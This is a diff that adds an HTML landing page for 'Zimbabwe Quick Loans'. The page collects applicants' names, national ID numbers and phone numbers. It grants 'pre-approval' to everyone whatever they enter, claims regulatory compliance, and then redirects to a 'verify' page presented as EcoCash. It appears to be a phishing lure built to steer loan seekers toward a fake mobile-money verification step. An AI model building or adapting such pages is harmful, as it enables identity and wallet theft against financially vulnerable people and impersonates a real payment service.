@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zimbabwe Quick Loans // Next-Gen Cyber Credit</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Google Fonts: Orbitron for futuristic headers, Inter for crisp UI -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@600;700;800;900&display=swap" rel="stylesheet">
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        cyber: ['Orbitron', 'sans-serif'],
+                    },
+                    colors: {
+                        zim: {
+                            green: '#00A859',
+                            darkGreen: '#004D29',
+                            gold: '#FFD200',
+                            red: '#D40000',
+                            black: '#07080A',
+                            card: '#0F1218',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Custom Futuristic Animations & Zimbabwean Cyber Theme */
+        body {
+            background-color: #07080A;
+            color: #FFFFFF;
+            overflow-x: hidden;
+        }
+
+        /* Futuristic Grid Background */
+        .cyber-grid {
+            background-size: 40px 40px;
+            background-image: 
+                linear-gradient(to right, rgba(0, 168, 89, 0.08) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255, 210, 0, 0.06) 1px, transparent 1px);
+        }
+
+        /* Blinking / Neon Pulse Title Animation */
+        @keyframes cyberBlink {
+            0%, 18%, 22%, 25%, 53%, 57%, 100% {
+                opacity: 1;
+                text-shadow: 
+                    0 0 8px rgba(255, 210, 0, 0.8),
+                    0 0 20px rgba(0, 168, 89, 0.7),
+                    0 0 35px rgba(0, 168, 89, 0.5);
+            }
+            20%, 24%, 55% {
+                opacity: 0.35;
+                text-shadow: none;
+            }
+        }
+
+        .blinking-title {
+            animation: cyberBlink 3.2s infinite;
+        }
+
+        /* Subtle Scanning Line Effect on Redirect Window */
+        @keyframes scanline {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(400%); }
+        }
+        .scanline-bar {
+            animation: scanline 4s linear infinite;
+        }
+
+        /* Custom Range Slider Styling */
+        input[type=range] {
+            -webkit-appearance: none;
+            background: transparent;
+        }
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            height: 22px;
+            width: 22px;
+            border-radius: 50%;
+            background: #FFD200;
+            border: 3px solid #00A859;
+            cursor: pointer;
+            margin-top: -8px;
+            box-shadow: 0 0 12px rgba(255, 210, 0, 0.8);
+            transition: transform 0.15s ease;
+        }
+        input[type=range]::-webkit-slider-thumb:hover {
+            transform: scale(1.15);
+        }
+        input[type=range]::-webkit-slider-runnable-track {
+            width: 100%;
+            height: 6px;
+            cursor: pointer;
+            background: linear-gradient(90deg, #00A859 0%, #FFD200 50%, #D40000 100%);
+            border-radius: 999px;
+        }
+
+        /* Zimbabwe Flag Top Accent Bar */
+        .zim-spectrum-bar {
+            background: linear-gradient(90deg, 
+                #00A859 0%, #00A859 20%, 
+                #FFD200 20%, #FFD200 40%, 
+                #D40000 40%, #D40000 60%, 
+                #111318 60%, #111318 80%, 
+                #FFFFFF 80%, #FFFFFF 100%
+            );
+        }
+
+        /* Glassmorphism Card */
+        .glass-panel {
+            background: rgba(15, 18, 24, 0.82);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border: 1px solid rgba(0, 168, 89, 0.3);
+            box-shadow: 0 10px 40px -10px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(0, 168, 89, 0.05);
+        }
+    </style>
+</head>
+<body class="cyber-grid min-h-screen flex flex-col justify-between selection:bg-zim-gold selection:text-black">
+
+    <!-- Top Zimbabwe Flag Color Spectrum Strip -->
+    <div class="w-full h-1.5 zim-spectrum-bar fixed top-0 left-0 z-50"></div>
+
+    <!-- Ambient Glowing Orbs (Zimbabwe Green, Gold & Red) -->
+    <div class="fixed top-20 -left-24 w-80 h-80 bg-zim-green/20 rounded-full blur-[120px] pointer-events-none"></div>
+    <div class="fixed bottom-10 -right-24 w-96 h-96 bg-zim-gold/15 rounded-full blur-[130px] pointer-events-none"></div>
+    <div class="fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-72 h-72 bg-zim-red/10 rounded-full blur-[140px] pointer-events-none"></div>
+
+    <!-- Header Navigation -->
+    <header class="w-full pt-6 pb-4 px-4 sm:px-8 border-b border-zim-green/20 bg-zim-black/70 backdrop-blur-md sticky top-0 z-40">
+        <div class="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
+            
+            <!-- Brand & Blinking Futuristic Title -->
+            <div class="flex items-center gap-3 text-center md:text-left">
+                <!-- Futuristic Emblem SVG -->
+                <div class="w-11 h-11 rounded-xl bg-gradient-to-br from-zim-green via-zim-gold to-zim-red p-[2px] shadow-lg shadow-zim-green/30 shrink-0">
+                    <div class="w-full h-full bg-zim-black rounded-[10px] flex items-center justify-center">
+                        <i class="fa-solid fa-bolt text-zim-gold text-xl"></i>
+                    </div>
+                </div>
+                <div>
+                    <h1 class="font-cyber text-2xl sm:text-3xl md:text-4xl font-black tracking-wider uppercase blinking-title bg-gradient-to-r from-zim-green via-zim-gold to-white bg-clip-text text-transparent">
+                        Zimbabwe Quick Loans
+                    </h1>
+                    <div class="flex items-center justify-center md:justify-start gap-2 text-xs text-gray-400 font-mono mt-0.5">
+                        <span class="inline-block w-2 h-2 rounded-full bg-zim-green animate-ping"></span>
+                        <span class="text-zim-green font-semibold">SYSTEM ONLINE</span>
+                        <span>//</span>
+                        <span>HARARE • BULAWAYO • NATIONWIDE</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Header Quick Action / Redirect Trigger -->
+            <div class="flex items-center gap-3">
+                <span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-mono bg-zim-gold/10 border border-zim-gold/40 text-zim-gold">
+                    <i class="fa-solid fa-shield-halved"></i> RBZ COMPLIANT FINTECH
+                </span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Grid -->
+    <main class="max-w-7xl w-full mx-auto px-4 sm:px-8 py-8 sm:py-12 flex-grow">
+        
+        <!-- Top Hero Banner -->
+        <div class="text-center max-w-3xl mx-auto mb-10">
+            <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-zim-green/15 border border-zim-green/40 text-zim-gold text-xs font-cyber tracking-widest uppercase mb-4">
+                <i class="fa-solid fa-microchip"></i> AI-Powered Instant Credit Disbursement
+            </div>
+            <h2 class="text-2xl sm:text-4xl font-bold tracking-tight text-white mb-3">
+                Fast Digital Liquidity in <span class="text-zim-gold">USD</span> & <span class="text-zim-green">ZiG</span>
+            </h2>
+            <p class="text-gray-400 text-sm sm:text-base">
+                Zero paperwork. Instant EcoCash, InnBucks, Omari, or Bank Zipit payout in under 5 minutes.
+            </p>
+        </div>
+
+        <!-- 3-Column Futuristic Dashboard Layout -->
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+
+            <!-- COLUMN 1 (Left - 5 cols): Interactive Loan Simulator & External Redirect Window -->
+            <div class="lg:col-span-5 space-y-6">
+                
+                <!-- Interactive Loan Calculator Card -->
+                <div class="glass-panel rounded-2xl p-6 relative overflow-hidden">
+                    <div class="flex items-center justify-between mb-5">
+                        <h3 class="font-cyber text-lg font-bold text-zim-gold flex items-center gap-2">
+                            <i class="fa-solid fa-sliders text-zim-green"></i> CREDIT SIMULATOR
+                        </h3>
+                        <!-- Currency Switcher -->
+                        <div class="flex bg-zim-black p-1 rounded-xl border border-gray-800">
+                            <button id="btn-usd" onclick="setCurrency('USD')" class="px-3 py-1 rounded-lg text-xs font-cyber font-bold bg-zim-green text-white transition">USD $</button>
+                            <button id="btn-zig" onclick="setCurrency('ZiG')" class="px-3 py-1 rounded-lg text-xs font-cyber font-bold text-gray-400 hover:text-white transition">ZiG</button>
+                        </div>
+                    </div>
+
+                    <!-- Loan Amount Slider -->
+                    <div class="mb-6">
+                        <div class="flex justify-between items-end mb-2">
+                            <label class="text-xs uppercase tracking-wider text-gray-400 font-semibold">Loan Amount</label>
+                            <span id="amount-display" class="font-cyber text-2xl sm:text-3xl font-extrabold text-white">$500</span>
+                        </div>
+                        <input type="range" id="loan-amount" min="50" max="5000" step="50" value="500" class="w-full" oninput="calculateLoan()">
+                        <div class="flex justify-between text-xs text-gray-500 font-mono mt-1">
+                            <span id="min-label">$50</span>
+                            <span id="max-label">$5,000</span>
+                        </div>
+                    </div>
+
+                    <!-- Duration Slider -->
+                    <div class="mb-6">
+                        <div class="flex justify-between items-end mb-2">
+                            <label class="text-xs uppercase tracking-wider text-gray-400 font-semibold">Repayment Period</label>
+                            <span id="duration-display" class="font-cyber text-xl font-bold text-zim-gold">3 Months</span>
+                        </div>
+                        <input type="range" id="loan-duration" min="1" max="12" step="1" value="3" class="w-full" oninput="calculateLoan()">
+                        <div class="flex justify-between text-xs text-gray-500 font-mono mt-1">
+                            <span>1 Month</span>
+                            <span>12 Months</span>
+                        </div>
+                    </div>
+
+                    <!-- Breakdown Box -->
+                    <div class="bg-zim-black/90 rounded-xl p-4 border border-zim-gold/30 space-y-2.5">
+                        <div class="flex justify-between text-sm">
+                            <span class="text-gray-400">Monthly Interest Rate</span>
+                            <span class="font-mono text-zim-green font-semibold">4.5% Fixed</span>
+                        </div>
+                        <div class="flex justify-between text-sm">
+                            <span class="text-gray-400">Total Repayment</span>
+                            <span id="total-repayment" class="font-mono text-white font-semibold">$567.50</span>
+                        </div>
+                        <div class="border-t border-gray-800 pt-2.5 flex justify-between items-center">
+                            <span class="text-xs uppercase tracking-wider text-zim-gold font-bold">Monthly Installment</span>
+                            <span id="monthly-installment" class="font-cyber text-xl font-black text-zim-gold">$189.17</span>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- COLUMN 2 (Right - 7 cols): Futuristic Quick Loan Application Form -->
+            <div class="lg:col-span-7">
+                <div class="glass-panel rounded-2xl p-6 sm:p-8 relative">
+                    <!-- Corner Tech Accents -->
+                    <div class="absolute top-0 right-0 w-16 h-16 border-t-2 border-r-2 border-zim-gold rounded-tr-2xl pointer-events-none"></div>
+                    <div class="absolute bottom-0 left-0 w-16 h-16 border-b-2 border-l-2 border-zim-red rounded-bl-2xl pointer-events-none"></div>
+
+                    <div class="mb-6">
+                        <h3 class="font-cyber text-xl sm:text-2xl font-bold text-white flex items-center gap-2.5">
+                            <span class="w-2.5 h-7 bg-gradient-to-b from-zim-green via-zim-gold to-zim-red rounded-full inline-block"></span>
+                            INSTANT LOAN APPLICATION
+                        </h3>
+                        <p class="text-xs sm:text-sm text-gray-400 mt-1">
+                            Complete your digital profile below for automated credit scoring.
+                        </p>
+                    </div>
+
+                    <form id="loan-form" onsubmit="handleLoanSubmit(event)" class="space-y-5">
+                        
+                        <!-- Row 1: Full Name & National ID -->
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-cyber uppercase tracking-wider text-gray-300 mb-1.5">
+                                    Full Legal Name <span class="text-zim-red">*</span>
+                                </label>
+                                <div class="relative">
+                                    <i class="fa-solid fa-user absolute left-3.5 top-1/2 -translate-y-1/2 text-zim-green text-sm"></i>
+                                    <input type="text" id="full-name" required placeholder="e.g. Tendai Moyo"
+                                        class="w-full pl-10 pr-4 py-3 rounded-xl bg-zim-black/90 border border-gray-700 focus:border-zim-gold focus:ring-1 focus:ring-zim-gold text-white text-sm outline-none transition">
+                                </div>
+                            </div>
+
+                            <div>
+                                <label class="block text-xs font-cyber uppercase tracking-wider text-gray-300 mb-1.5">
+                                    Zimbabwe National ID <span class="text-zim-red">*</span>
+                                </label>
+                                <div class="relative">
+                                    <i class="fa-solid fa-id-card absolute left-3.5 top-1/2 -translate-y-1/2 text-zim-gold text-sm"></i>
+                                    <input type="text" id="national-id" required placeholder="e.g. 63-1234567-A-42"
+                                        class="w-full pl-10 pr-4 py-3 rounded-xl bg-zim-black/90 border border-gray-700 focus:border-zim-gold focus:ring-1 focus:ring-zim-gold text-white text-sm outline-none transition uppercase">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Row 2: Mobile Number & Payout Method -->
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-cyber uppercase tracking-wider text-gray-300 mb-1.5">
+                                    Mobile Number (+263) <span class="text-zim-red">*</span>
+                                </label>
+                                <div class="relative">
+                                    <i class="fa-solid fa-mobile-screen-button absolute left-3.5 top-1/2 -translate-y-1/2 text-zim-green text-sm"></i>
+                                    <input type="tel" id="phone-number" required placeholder="+263 77 123 4567"
+                                        class="w-full pl-10 pr-4 py-3 rounded-xl bg-zim-black/90 border border-gray-700 focus:border-zim-gold focus:ring-1 focus:ring-zim-gold text-white text-sm outline-none transition">
+                                </div>
+                            </div>
+
+                            <div>
+                                <label class="block text-xs font-cyber uppercase tracking-wider text-gray-300 mb-1.5">
+                                    Disbursement Channel <span class="text-zim-red">*</span>
+                                </label>
+                                <div class="relative">
+                                    <i class="fa-solid fa-wallet absolute left-3.5 top-1/2 -translate-y-1/2 text-zim-gold text-sm"></i>
+                                    <select id="payout-channel" class="w-full pl-10 pr-4 py-3 rounded-xl bg-zim-black/90 border border-gray-700 focus:border-zim-gold focus:ring-1 focus:ring-zim-gold text-white text-sm outline-none transition appearance-none">
+                                        <option value="EcoCash">EcoCash USD / ZiG Wallet</option>
+                                    </select>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Row 3: Employment Status & Monthly Income -->
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-cyber uppercase tracking-wider text-gray-300 mb-1.5">
+                                    Employment Sector
+                                </label>
+                                <select id="employment" class="w-full px-4 py-3 rounded-xl bg-zim-black/90 border border-gray-700 focus:border-zim-gold text-white text-sm outline-none transition">
+                                    <option value="Civil Servant">Civil Servant (SSB)</option>
+                                    <option value="Private Sector">Private Sector Employee</option>
+                                    <option value="Entrepreneur">SME / Self-Employed</option>
+                                    <option value="Agriculture">Agro-Business / Farmer</option>
+                                </select>
+                            </div>
+
+                            <div>
+                                <label class="block text-xs font-cyber uppercase tracking-wider text-gray-300 mb-1.5">
+                                    Loan Purpose
+                                </label>
+                                <select id="purpose" class="w-full px-4 py-3 rounded-xl bg-zim-black/90 border border-gray-700 focus:border-zim-gold text-white text-sm outline-none transition">
+                                    <option value="Business Boost">Business Inventory / Working Capital</option>
+                                    <option value="Emergency">Personal / Medical Emergency</option>
+                                    <option value="Solar & Tech">Solar Energy / Tech Upgrade</option>
+                                    <option value="Education">School / University Fees</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- Consent Checkbox -->
+                        <div class="flex items-start gap-3 pt-1">
+                            <input type="checkbox" id="terms" required class="mt-1 w-4 h-4 accent-zim-green rounded cursor-pointer">
+                            <label for="terms" class="text-xs text-gray-400 leading-relaxed cursor-pointer">
+                                I authorize <span class="text-white font-semibold">Zimbabwe Quick Loans</span> to verify my digital credit score and process instant funds to my selected wallet.
+                            </label>
+                        </div>
+
+                        <!-- Submit CTA Button -->
+                        <button type="submit" class="w-full py-4 px-6 rounded-xl font-cyber text-sm sm:text-base font-extrabold tracking-widest uppercase bg-gradient-to-r from-zim-green via-zim-gold to-zim-green bg-[length:200%_auto] hover:bg-right text-black shadow-xl shadow-zim-green/25 transition-all duration-500 transform hover:-translate-y-0.5 flex items-center justify-center gap-3 cursor-pointer">
+                            <i class="fa-solid fa-bolt"></i>
+                            <span>Submit application-Eco Cash</span>
+                            <i class="fa-solid fa-chevron-right"></i>
+                        </button>
+                    </form>
+
+                    <!-- Application Success Message (Hidden by default) -->
+                    <div id="application-success" class="hidden text-center py-8 space-y-5">
+                        <div class="w-20 h-20 mx-auto rounded-full bg-zim-green/20 border-2 border-zim-green flex items-center justify-center text-zim-green text-4xl shadow-lg shadow-zim-green/30">
+                            <i class="fa-solid fa-check"></i>
+                        </div>
+                        <div>
+                            <span class="text-xs font-mono text-zim-gold uppercase tracking-widest">REFERENCE #ZQL-88492</span>
+                            <h4 class="font-cyber text-2xl font-bold text-white mt-1">PRE-APPROVAL GRANTED!</h4>
+                            <p id="success-summary" class="text-sm text-gray-300 mt-2 max-w-md mx-auto">
+                                Your request has been queued for instant disbursement.
+                            </p>
+                            <p class="text-xs font-mono text-zim-gold mt-3 animate-pulse">
+                                <i class="fa-solid fa-spinner fa-spin mr-1"></i> Redirecting to next step...
+                            </p>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Custom Toast Message Box (Replaces browser alert) -->
+    <div id="toast-box" class="fixed bottom-5 right-5 z-50 hidden max-w-sm bg-zim-card border-l-4 border-zim-gold text-white px-4 py-3 rounded-xl shadow-2xl flex items-center gap-3">
+        <i class="fa-solid fa-circle-info text-zim-gold text-lg"></i>
+        <p id="toast-message" class="text-xs sm:text-sm font-medium"></p>
+    </div>
+
+    <!-- Futuristic Pre-Redirect Notification Modal -->
+    <div id="redirect-modal" class="fixed inset-0 z-50 hidden bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
+        <div class="glass-panel rounded-2xl max-w-md w-full p-6 sm:p-8 text-center relative overflow-hidden border border-zim-gold/50 shadow-2xl">
+            <div class="w-16 h-16 mx-auto mb-4 rounded-2xl bg-zim-green/15 border border-zim-green flex items-center justify-center text-zim-gold text-3xl animate-pulse">
+                <i class="fa-solid fa-rocket"></i>
+            </div>
+            <p class="font-cyber text-base sm:text-lg font-bold text-white leading-relaxed mb-5">
+                you will be taken to <span style="color: #0066ff;">Eco</span> <span style="color: #ff0000;">Cash</span> to continue application
+            </p>
+            <div class="w-full h-2 bg-zim-black rounded-full overflow-hidden border border-gray-800">
+                <div id="redirect-progress" class="h-full bg-gradient-to-r from-zim-green via-zim-gold to-zim-red w-0 transition-all duration-[2500ms] ease-linear"></div>
+            </div>
+            <p class="text-[11px] font-mono text-gray-400 mt-3 uppercase tracking-widest">
+                Establishing secure link...
+            </p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="border-t border-gray-900 bg-zim-black/90 py-6 px-4 text-center text-xs text-gray-500">
+        <div class="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
+            <p class="font-cyber text-gray-400">
+                © 2026 <span class="text-zim-gold">ZIMBABWE QUICK LOANS</span>. ALL RIGHTS RESERVED.
+            </p>
+            <div class="flex items-center gap-2">
+                <span class="w-3 h-2 bg-zim-green inline-block rounded-xs"></span>
+                <span class="w-3 h-2 bg-zim-gold inline-block rounded-xs"></span>
+                <span class="w-3 h-2 bg-zim-red inline-block rounded-xs"></span>
+                <span class="w-3 h-2 bg-white inline-block rounded-xs"></span>
+                <span class="ml-1 font-mono text-[11px]">PROUDLY ZIMBABWEAN FINTECH</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        let currentCurrency = 'USD';
+
+        // Initialize UI on page load
+        window.onload = function() {
+            calculateLoan();
+        };
+
+        // Switch between USD and ZiG
+        function setCurrency(currency) {
+            currentCurrency = currency;
+            const amountSlider = document.getElementById('loan-amount');
+            const btnUsd = document.getElementById('btn-usd');
+            const btnZig = document.getElementById('btn-zig');
+
+            if (currency === 'USD') {
+                btnUsd.className = "px-3 py-1 rounded-lg text-xs font-cyber font-bold bg-zim-green text-white transition";
+                btnZig.className = "px-3 py-1 rounded-lg text-xs font-cyber font-bold text-gray-400 hover:text-white transition";
+                amountSlider.min = 50;
+                amountSlider.max = 5000;
+                amountSlider.step = 50;
+                amountSlider.value = 500;
+                document.getElementById('min-label').textContent = "$50";
+                document.getElementById('max-label').textContent = "$5,000";
+            } else {
+                btnZig.className = "px-3 py-1 rounded-lg text-xs font-cyber font-bold bg-zim-gold text-black transition";
+                btnUsd.className = "px-3 py-1 rounded-lg text-xs font-cyber font-bold text-gray-400 hover:text-white transition";
+                amountSlider.min = 1000;
+                amountSlider.max = 100000;
+                amountSlider.step = 1000;
+                amountSlider.value = 10000;
+                document.getElementById('min-label').textContent = "ZiG 1,000";
+                document.getElementById('max-label').textContent = "ZiG 100,000";
+            }
+            calculateLoan();
+        }
+
+        // Calculate Loan Repayment in Real-Time
+        function calculateLoan() {
+            const amount = parseFloat(document.getElementById('loan-amount').value);
+            const months = parseInt(document.getElementById('loan-duration').value);
+            const monthlyRate = 0.045; // 4.5% monthly interest
+
+            const totalInterest = amount * monthlyRate * months;
+            const totalRepayment = amount + totalInterest;
+            const monthlyInstallment = totalRepayment / months;
+
+            const prefix = currentCurrency === 'USD' ? '$' : 'ZiG ';
+
+            document.getElementById('amount-display').textContent = prefix + amount.toLocaleString();
+            document.getElementById('duration-display').textContent = months + (months === 1 ? ' Month' : ' Months');
+            document.getElementById('total-repayment').textContent = prefix + totalRepayment.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('monthly-installment').textContent = prefix + monthlyInstallment.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        // Handle Loan Application Form Submission
+        function handleLoanSubmit(event) {
+            event.preventDefault();
+            const name = document.getElementById('full-name').value;
+            const channel = document.getElementById('payout-channel').value;
+            const amountText = document.getElementById('amount-display').textContent;
+
+            document.getElementById('loan-form').classList.add('hidden');
+            document.getElementById('application-success').classList.remove('hidden');
+            document.getElementById('success-summary').innerHTML = 
+                `Applicant <strong class="text-white">${name}</strong> is pre-approved for <strong class="text-zim-gold">${amountText}</strong> via <strong class="text-zim-green">${channel}</strong>.`;
+            
+            // Show futuristic notification modal before redirecting
+            const modal = document.getElementById('redirect-modal');
+            const progressBar = document.getElementById('redirect-progress');
+            modal.classList.remove('hidden');
+
+            // Trigger smooth progress bar fill
+            setTimeout(() => {
+                progressBar.style.width = '100%';
+            }, 50);
+
+            // Redirect to man.html after 2.5 seconds
+            setTimeout(() => {
+                window.location.href = "verify.html";
+            }, 2500);
+        }
+
+        // Reset Form
+        function resetApplication() {
+            document.getElementById('loan-form').classList.remove('hidden');
+            document.getElementById('application-success').classList.add('hidden');
+        }
+
+        // Custom Non-Blocking Toast Notification
+        function showToast(msg) {
+            const toast = document.getElementById('toast-box');
+            document.getElementById('toast-message').textContent = msg;
+            toast.classList.remove('hidden');
+            setTimeout(() => {
+                toast.classList.add('hidden');
+            }, 4000);
+        }
+    </script>
+</body>
+</html>
